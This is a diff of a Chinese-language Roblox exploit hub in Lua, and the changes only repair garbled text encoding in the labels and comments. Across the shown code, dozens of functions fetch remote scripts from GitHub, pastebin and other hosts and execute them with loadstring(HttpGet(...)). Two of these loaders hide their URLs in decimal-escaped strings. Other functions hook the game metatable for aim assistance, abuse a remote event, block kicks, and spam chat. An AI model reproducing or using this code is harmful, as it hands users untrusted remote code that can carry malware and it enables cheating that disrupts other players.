     local function toggleNightVision()
         playClickSound()
         nightVision = not nightVision
-        ButtonInstances.NightVisionButton.Text = "澶滆妯″紡 [" .. (nightVision and "寮€鍚痌" or "鍏抽棴]")
+        ButtonInstances.NightVisionButton.Text = "夜视模式 [" .. (nightVision and "开启]" or "关闭]")
         ButtonInstances.NightVisionButton.TextColor3 = nightVision and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
         
         if nightVision then
-            -- 淇濆瓨鍘熷璁剧疆
+            -- 保存原始设置
             originalLightingSettings.Ambient = Lighting.Ambient
             originalLightingSettings.Brightness = Lighting.Brightness
             originalLightingSettings.ClockTime = Lighting.ClockTime
             originalLightingSettings.GlobalShadows = Lighting.GlobalShadows
             
-            -- 搴旂敤澶滆鏁堟灉
+            -- 应用夜视效果
             Lighting.Ambient = Color3.fromRGB(128, 128, 128)
             Lighting.Brightness = 2
             Lighting.ClockTime = 12
             Lighting.GlobalShadows = false
             
-            showNotification("澶滆妯″紡宸插紑鍚�", Color3.fromRGB(0, 150, 200))
+            showNotification("夜视模式已开启", Color3.fromRGB(0, 150, 200))
         else
-            -- 鎭㈠鍘熷璁剧疆
+            -- 恢复原始设置
             if originalLightingSettings.Ambient then
                 Lighting.Ambient = originalLightingSettings.Ambient
             end
@@ -1582,11 +1582,11 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                 Lighting.GlobalShadows = originalLightingSettings.GlobalShadows
             end
             
-            showNotification("澶滆妯″紡宸插叧闂�", Color3.fromRGB(150, 150, 150))
+            showNotification("夜视模式已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
-    -- UI棰滆壊璋冭妭
+    -- UI颜色调节
     local function changeUIColor()
         playClickSound()
         local colors = {
@@ -1614,89 +1614,89 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
             tabButton.BackgroundColor3 = (tabName == CurrentTab) and color or Color3.new(color.R * 0.3, color.G * 0.3, color.B * 0.3)
         end
         
-        showNotification("UI棰滆壊宸叉洿鏀�", color)
+        showNotification("UI颜色已更改", color)
     end
 
-    -- 鑷潃
+    -- 自杀
     local function suicide()
         playClickSound()
         local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
         if humanoid then
             humanoid.Health = 0
-            showNotification("宸茶嚜鏉€!", Color3.fromRGB(255, 0, 0))
+            showNotification("已自杀!", Color3.fromRGB(255, 0, 0))
         end
     end
 
-    -- 鏃犳晫鍔熻兘锛堝姞杞藉閮ㄨ剼鏈級
+    -- 无敌功能（加载外部脚本）
     local function loadInvincibleScript()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/5twh2hsf9j-byte/BowenPrime67/refs/heads/main/Python"))()
-        showNotification("鏃犳晫鑴氭湰宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("无敌脚本已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 鏃犳晫v2鍔熻兘
+    -- 无敌v2功能
     local function loadInvincibleV2()
         playClickSound()
         loadstring(game:HttpGetAsync("https://pastebin.com/raw/RPwyPvEi"))()
-        showNotification("鏃犳晫v2宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("无敌v2已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 鏃犳晫v3鍔熻兘
+    -- 无敌v3功能
     local function loadInvincibleV3()
         playClickSound()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-        showNotification("鏃犳晫v3宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("无敌v3已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 韪忕┖琛岃蛋鍔熻兘
+    -- 踏空行走功能
     local function loadWalkAir()
         playClickSound()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()
-        showNotification("韪忕┖琛岃蛋宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("踏空行走已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 鏃犳晫灏戜緺椋炶R6
+    -- 无敌少侠飞行R6
     local function toggleInvincibleFlyR6()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E6%97%A0%E6%95%8C%E5%B0%91%E4%BE%A0%E9%A3%9E%E8%A1%8Cr6.txt"))()
-        showNotification("鏃犳晫灏戜緺椋炶R6宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("无敌少侠飞行R6已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 琚仐寮冭剼鏈簩
+    -- 被遗弃脚本二
     local function loadForsakenScript2()
         playClickSound()
         loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/SilkScripts/AppleStuff/refs/heads/main/AppleFSKV2")))()
-        showNotification("琚仐寮冭剼鏈簩宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("被遗弃脚本二已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE榄旂帇1x1x1x1
+    -- FE魔王1x1x1x1
     local function loadFE1x1x1x1()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-1x1x1x1-lord-by-White-Hat-71150"))()
-        showNotification("FE榄旂帇1x1x1x1宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE魔王1x1x1x1已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鐑嚎鏋啗
+    -- FE热线枪膛
     local function loadFEHotlineRifle()
         playClickSound()
         loadstring(game:HttpGet(('https://gist.githubusercontent.com/axelinharlem182/10fe06d674fe91383254e87fb48bb8d9/raw/306a47f46c2f212bbec20fa657e4a1c909927e8e/Hotline%2520Rifle'),true))()
-        showNotification("FE鐑嚎鏋啗宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE热线枪膛已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE閾佹嫵
+    -- FE铁拳
     local function loadFEIronFist()
         playClickSound()
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
-        showNotification("FE閾佹嫵宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE铁拳已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 瀛愬脊杩借釜
+    -- 子弹追踪
     local function toggleBulletTrack()
         playClickSound()
         bulletTrackEnabled = not bulletTrackEnabled
         
         if bulletTrackEnabled then
-            ButtonInstances.BulletTrackButton.Text = "瀛愬脊杩借釜 [寮€鍚痌"
+            ButtonInstances.BulletTrackButton.Text = "子弹追踪 [开启]"
             ButtonInstances.BulletTrackButton.TextColor3 = Color3.fromRGB(0, 255, 150)
             
             local Camera = Workspace.CurrentCamera
@@ -1739,17 +1739,17 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
             
             setreadonly(GameMetaTable, true)
             
-            showNotification("瀛愬脊杩借釜宸插紑鍚�!", Color3.fromRGB(0, 200, 0))
+            showNotification("子弹追踪已开启!", Color3.fromRGB(0, 200, 0))
         else
-            ButtonInstances.BulletTrackButton.Text = "瀛愬脊杩借釜 [鍏抽棴]"
+            ButtonInstances.BulletTrackButton.Text = "子弹追踪 [关闭]"
             ButtonInstances.BulletTrackButton.TextColor3 = Color3.fromRGB(200, 200, 255)
             
-            -- 娉ㄦ剰锛氱敱浜庝慨鏀逛簡鍏冭〃锛屾棤娉曠畝鍗曟仮澶嶏紝鎵€浠ヨ繖涓姛鑳戒竴鏃﹀紑鍚氨鏃犳硶鍏抽棴
-            showNotification("瀛愬脊杩借釜鏃犳硶鍏抽棴锛岄渶瑕侀噸鏂板姞杞芥父鎴�", Color3.fromRGB(255, 100, 0))
+            -- 注意：由于修改了元表，无法简单恢复，所以这个功能一旦开启就无法关闭
+            showNotification("子弹追踪无法关闭，需要重新加载游戏", Color3.fromRGB(255, 100, 0))
         end
     end
 
-    -- 淇勪亥淇勫窞鑴氭湰2
+    -- 俄亥俄州脚本2
     local function loadOhio2()
         playClickSound()
         local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -1783,7 +1783,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                        or findRemoteEvent("rocketHit")
         if not rocketHit then
             warn("rocketHit not found!")
-            showNotification("鏈壘鍒皉ocketHit杩滅▼浜嬩欢", Color3.fromRGB(255, 100, 0))
+            showNotification("未找到rocketHit远程事件", Color3.fromRGB(255, 100, 0))
             return
         end
 
@@ -1834,195 +1834,195 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
             return originalNamecall(self, ...)
         end)
         
-        showNotification("淇勪亥淇勫窞鑴氭湰2宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("俄亥俄州脚本2已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- ============ 鏂版坊鍔犵殑鍔熻兘鍑芥暟 ============
+    -- ============ 新添加的功能函数 ============
 
-    -- FE鑴氭湰鏁村悎v2
+    -- FE脚本整合v2
     local function loadFEScriptIntegrationV2()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-TVgui-fe-bypass-V2-72662"))()
-        showNotification("FE鑴氭湰鏁村悎v2宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE脚本整合v2已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE璇轰附
+    -- FE诺丽
     local function loadFENuoli()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/qwertys/refs/heads/main/qwerty0.lua"))()
-        showNotification("FE璇轰附宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE诺丽已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 鐢绘垜鑴氭湰1
+    -- 画我脚本1
     local function loadDrawMeScript1()
         playClickSound()
         loadstring(game:HttpGet("https://ancestrychanged.fun/loader.lua"))()
-        showNotification("鐢绘垜鑴氭湰1宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("画我脚本1已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 鐢绘垜鑴氭湰2
+    -- 画我脚本2
     local function loadDrawMeScript2()
         playClickSound()
         loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/3387bc2c06c6ab7e0606178d675e0ad46b29427c6a1f81e96a4c9d7a090eb68e/download"))()
-        showNotification("鐢绘垜鑴氭湰2宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("画我脚本2已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 鐢绘垜鑴氭湰3锛堟柊澧烇級
+    -- 画我脚本3（新增）
     local function loadDrawMeScript3()
         playClickSound()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/KENNY鐢绘垜.lua"))()
-        showNotification("鐢绘垜鑴氭湰3宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/KENNY画我.lua"))()
+        showNotification("画我脚本3已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 鍦ㄦ湇鍔″櫒鐜╄閬楀純鑴氭湰
+    -- 在服务器玩被遗弃脚本
     local function loadPlayForsakenOnServer()
         playClickSound()
         loadstring(game:HttpGet("https://pastebin.com/raw/CLwqkVKQ"))()
-        showNotification("鍦ㄦ湇鍔″櫒鐜╄閬楀純鑴氭湰宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("在服务器玩被遗弃脚本已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鏁村悎v3
+    -- FE整合v3
     local function loadFEIntegrationV3()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/Genesisloader/main/Script.lua"))()
-        showNotification("FE鏁村悎v3宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE整合v3已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE AC6婕忔礊鏀鹃煶涔�
+    -- FE AC6漏洞放音乐
     local function loadFEAC6MusicVulnerability()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Ac6-Music-Vulnerability-25536"))()
-        showNotification("FE AC6婕忔礊鏀鹃煶涔愬凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE AC6漏洞放音乐已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- xa淇勪亥淇勫窞
+    -- xa俄亥俄州
     local function loadXAOhio()
         playClickSound()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xingtaiduan/Script/refs/heads/main/Games/淇勪亥淇勫窞.lua"))()
-        showNotification("xa淇勪亥淇勫窞宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xingtaiduan/Script/refs/heads/main/Games/俄亥俄州.lua"))()
+        showNotification("xa俄亥俄州已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 瀵肩涓績
+    -- 导管中心
     local function loadConduitCenter()
         playClickSound()
         loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()
-        showNotification("瀵肩涓績宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("导管中心已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 闃茶涪
+    -- 防踢
     local function loadAntiKick()
         playClickSound()
         loadstring(game:HttpGet("https://pastebin.com/raw/JTMNb3qQ"))()
-        showNotification("闃茶涪鑴氭湰宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("防踢脚本已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- UNX鑴氭湰
+    -- UNX脚本
     local function loadUNXScript()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/FPS-Flick-UNXHub-61980"))()
-        showNotification("unx鑴氭湰宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("unx脚本已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鑻﹀姏鎬�
+    -- FE苦力怕
     local function loadFECreeper()
         playClickSound()
         loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/7668ee0c4e1b352d8ac51efd6ed6f3fc/raw/d6421d586bf9b5d2e3fc0ebf14203c849494ec5f/FE%2520Zombie'))()
-        showNotification("FE鑻﹀姏鎬曞凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE苦力怕已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鍔犵壒鏋�
+    -- FE加特林
     local function loadFEGatling()
         playClickSound()
         loadstring(game:HttpGet("https://gist.githubusercontent.com/MelonsStuff/e7b408abcb813525d37e9b7a6bf301c9/raw/6421f9000e90e8a4c2ed57052208acbd6f9648dd/Minigun.txt"))()
-        showNotification("FE鍔犵壒鏋楀凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE加特林已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鎷冲嚮
+    -- FE拳击
     local function loadFEBoxing()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Gale%20Fighter"))()
-        showNotification("FE鎷冲嚮宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE拳击已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鎽╂墭杞�
+    -- FE摩托车
     local function loadFEMotorcycle()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Motorcycle"))()
-        showNotification("FE鎽╂墭杞﹀凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE摩托车已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE灏佺涔嬮敜
+    -- FE封禁之锤
     local function loadFEBanHammer()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Ban%20Hammer"))()
-        showNotification("FE灏佺涔嬮敜宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE封禁之锤已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鍔犵壒鏋�2
+    -- FE加特林2
     local function loadFEGatling2()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Minigun"))()
-        showNotification("FE鍔犵壒鏋�2宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE加特林2已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鏍兼枟鍔ㄤ綔
+    -- FE格斗动作
     local function loadFEFightingAnim()
         playClickSound()
         loadstring(game:HttpGet("https://github.com/Sinister-Scripts/Roblox-Exploits/raw/refs/heads/main/FE-Fighter-Cracked"))()
-        showNotification("FE鏍兼枟鍔ㄤ綔宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE格斗动作已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE R6鏃犲ご
+    -- FE R6无头
     local function loadFER6Headless()
         playClickSound()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/Gazer-Ha/Valiant-Ui-Lib-Gazed-/refs/heads/main/Head%20Pack'))()
-        showNotification("FE R6鏃犲ご宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE R6无头已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE R15鏃犲ご
+    -- FE R15无头
     local function loadFER15Headless()
         playClickSound()
-        loadstring(game:HttpGet(("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/鍋囨棤澶�.lua"),true))()
-        showNotification("FE R15鏃犲ご宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        loadstring(game:HttpGet(("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/假无头.lua"),true))()
+        showNotification("FE R15无头已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE N00kla5K鑿滃崟
+    -- FE N00kla5K菜单
     local function loadFEN00kla5K()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-N00kla5K-f3x-gui-80801"))()
-        showNotification("FE N00kla5K鑿滃崟宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE N00kla5K菜单已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE绱㈠凹鍏�
+    -- FE索尼克
     local function loadFESonic()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Sonic-script-r15-READ-DESC-81391"))()
-        showNotification("FE绱㈠凹鍏嬪凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE索尼克已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 瓒呯骇NB鑰佸鑴氭湰
+    -- 超级NB老外脚本
     local function loadSuperNBForeignScript()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-XVC-Hub-170-Games-Keyless-58593"))()
-        showNotification("瓒呯骇NB鑰佸鑴氭湰宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("超级NB老外脚本已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 涓嶇煡鍚嶉粦澹宠剼鏈�
+    -- 不知名黑壳脚本
     local function loadUnknownBlackShell()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-1x93x1x-private-GUI-leaked-lol-81399"))()
-        showNotification("涓嶇煡鍚嶉粦澹宠剼鏈凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("不知名黑壳脚本已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 鍒峰睆鍔熻兘
+    -- 刷屏功能
     local function loadSpam()
         playClickSound()
-        -- 绠€鍗曞疄鐢ㄧ殑鑱婂ぉ鍒峰睆鑴氭湰
+        -- 简单实用的聊天刷屏脚本
         local Players = game:GetService("Players")
         local LocalPlayer = game:GetService("Players").LocalPlayer
         local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
-        -- 鍒涘缓UI
+        -- 创建UI
         local ScreenGui = Instance.new("ScreenGui")
         ScreenGui.Name = "SimpleChatSpammer"
         ScreenGui.Parent = PlayerGui
@@ -2041,7 +2041,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         Title.Position = UDim2.new(0, 0, 0, 0)
         Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
         Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-        Title.Text = "鑱婂ぉ鍒峰睆宸ュ叿"
+        Title.Text = "聊天刷屏工具"
         Title.Font = Enum.Font.GothamBold
         Title.TextSize = 16
         Title.Parent = Frame
@@ -2051,7 +2051,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         MessageText.Position = UDim2.new(0.05, 0, 0.2, 0)
         MessageText.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
         MessageText.TextColor3 = Color3.fromRGB(255, 255, 255)
-        MessageText.PlaceholderText = "杈撳叆瑕佸彂閫佺殑娑堟伅..."
+        MessageText.PlaceholderText = "输入要发送的消息..."
         MessageText.Text = "Hello!"
         MessageText.Font = Enum.Font.Gotham
         MessageText.TextSize = 14
@@ -2062,7 +2062,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         IntervalText.Position = UDim2.new(0.05, 0, 0.55, 0)
         IntervalText.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
         IntervalText.TextColor3 = Color3.fromRGB(255, 255, 255)
-        IntervalText.PlaceholderText = "闂撮殧(绉�)"
+        IntervalText.PlaceholderText = "间隔(秒)"
         IntervalText.Text = "1"
         IntervalText.Font = Enum.Font.Gotham
         IntervalText.TextSize = 14
@@ -2073,7 +2073,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         StartButton.Position = UDim2.new(0.05, 0, 0.75, 0)
         StartButton.BackgroundColor3 = Color3.fromRGB(60, 180, 60)
         StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-        StartButton.Text = "寮€濮�"
+        StartButton.Text = "开始"
         StartButton.Font = Enum.Font.GothamBold
         StartButton.TextSize = 14
         StartButton.Parent = Frame
@@ -2083,18 +2083,18 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         StopButton.Position = UDim2.new(0.55, 0, 0.75, 0)
         StopButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
         StopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-        StopButton.Text = "鍋滄"
+        StopButton.Text = "停止"
         StopButton.Font = Enum.Font.GothamBold
         StopButton.TextSize = 14
         StopButton.Parent = Frame
 
-        -- 鍒峰睆鍔熻兘
+        -- 刷屏功能
         local Spamming = false
 
         local function SendChat(Message)
             local ReplicatedStorage = game:GetService("ReplicatedStorage")
             
-            -- 灏濊瘯浣跨敤榛樿鑱婂ぉ绯荤粺
+            -- 尝试使用默认聊天系统
             if ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
                 local ChatEvents = ReplicatedStorage.DefaultChatSystemChatEvents
                 if ChatEvents:FindFirstChild("SayMessageRequest") then
@@ -2103,7 +2103,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                 end
             end
             
-            -- 灏濊瘯浣跨敤TextChatService (鏂扮増鏈�)
+            -- 尝试使用TextChatService (新版本)
             local TextChatService = game:GetService("TextChatService")
             if TextChatService then
                 local Channels = TextChatService:FindFirstChild("TextChannels")
@@ -2145,7 +2145,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
             StartButton.BackgroundColor3 = Color3.fromRGB(60, 180, 60)
         end)
 
-        -- 鍏抽棴鎸夐挳
+        -- 关闭按钮
         local CloseButton = Instance.new("TextButton")
         CloseButton.Size = UDim2.new(0, 25, 0, 25)
         CloseButton.Position = UDim2.new(0.95, -25, 0, 5)
@@ -2161,41 +2161,41 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
             ScreenGui:Destroy()
         end)
 
-        print("鑱婂ぉ鍒峰睆宸ュ叿鍔犺浇鎴愬姛锛�")
-        showNotification("鑱婂ぉ鍒峰睆宸ュ叿宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        print("聊天刷屏工具加载成功！")
+        showNotification("聊天刷屏工具已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- bs涓績
+    -- bs中心
     local function loadBSCenter()
         playClickSound()
         BS="\104\116\116\112\115\58\47\47\103\105\116\101\101\46\99\111\109\47\66\83\95\115\99\114\105\112\116\47\115\99\114\105\112\116\47\114\97\119\47\109\97\115\116\101\114\47\66\83\95\83\99\114\105\112\116\46\76\117\97\117"
         loadstring(game:HttpGet(BS))()
-        showNotification("bs涓績宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("bs中心已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鍩规牴鑴氭湰闄勫睘鎭舵悶
+    -- FE培根脚本附属恶搞
     local function loadFEBaconPrank()
         playClickSound()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Baconhead123/ai/refs/heads/main/鍩规牴鎭舵悶"))()
-        showNotification("FE鍩规牴鑴氭湰闄勫睘鎭舵悶宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Baconhead123/ai/refs/heads/main/培根恶搞"))()
+        showNotification("FE培根脚本附属恶搞已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- ============ 鏂板鐨勫姛鑳藉嚱鏁� ============
+    -- ============ 新增的功能函数 ============
 
-    -- FE鍙嶆淳鏈壊
+    -- FE反派本色
     local function loadFEVillain()
         playClickSound()
         loadstring(game:HttpGet(('https://gist.githubusercontent.com/axelinharlem182/1ee425c9d850af697f8c3cb108a9d816/raw/c4660b01faf4db266e8031e310121a65836f98a7/The%2520Villain'),true))()
-        showNotification("FE鍙嶆淳鏈壊宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE反派本色已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 寰幆闈㈠悜闄勮繎鐜╁
+    -- 循环面向附近玩家
     local function toggleFaceNearby()
         playClickSound()
         faceNearbyEnabled = not faceNearbyEnabled
         
         if faceNearbyEnabled then
-            ButtonInstances.FaceNearbyButton.Text = "寰幆闈㈠悜闄勮繎鐜╁ [寮€鍚痌"
+            ButtonInstances.FaceNearbyButton.Text = "循环面向附近玩家 [开启]"
             ButtonInstances.FaceNearbyButton.TextColor3 = Color3.fromRGB(0, 255, 150)
             
             connections.faceNearby = RunService.Heartbeat:Connect(function()
@@ -2221,9 +2221,9 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                 end
             end)
             
-            showNotification("寰幆闈㈠悜闄勮繎鐜╁宸插紑鍚�", Color3.fromRGB(0, 200, 0))
+            showNotification("循环面向附近玩家已开启", Color3.fromRGB(0, 200, 0))
         else
-            ButtonInstances.FaceNearbyButton.Text = "寰幆闈㈠悜闄勮繎鐜╁ [鍏抽棴]"
+            ButtonInstances.FaceNearbyButton.Text = "循环面向附近玩家 [关闭]"
             ButtonInstances.FaceNearbyButton.TextColor3 = Color3.fromRGB(200, 200, 255)
             
             if connections.faceNearby then
@@ -2231,17 +2231,17 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                 connections.faceNearby = nil
             end
             
-            showNotification("寰幆闈㈠悜闄勮繎鐜╁宸插叧闂�", Color3.fromRGB(150, 150, 150))
+            showNotification("循环面向附近玩家已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
-    -- 寰幆鑳屽闄勮繎鐜╁
+    -- 循环背对附近玩家
     local function toggleBackNearby()
         playClickSound()
         backNearbyEnabled = not backNearbyEnabled
         
         if backNearbyEnabled then
-            ButtonInstances.BackNearbyButton.Text = "寰幆鑳屽闄勮繎鐜╁ [寮€鍚痌"
+            ButtonInstances.BackNearbyButton.Text = "循环背对附近玩家 [开启]"
             ButtonInstances.BackNearbyButton.TextColor3 = Color3.fromRGB(0, 255, 150)
             
             connections.backNearby = RunService.Heartbeat:Connect(function()
@@ -2268,9 +2268,9 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                 end
             end)
             
-            showNotification("寰幆鑳屽闄勮繎鐜╁宸插紑鍚�", Color3.fromRGB(0, 200, 0))
+            showNotification("循环背对附近玩家已开启", Color3.fromRGB(0, 200, 0))
         else
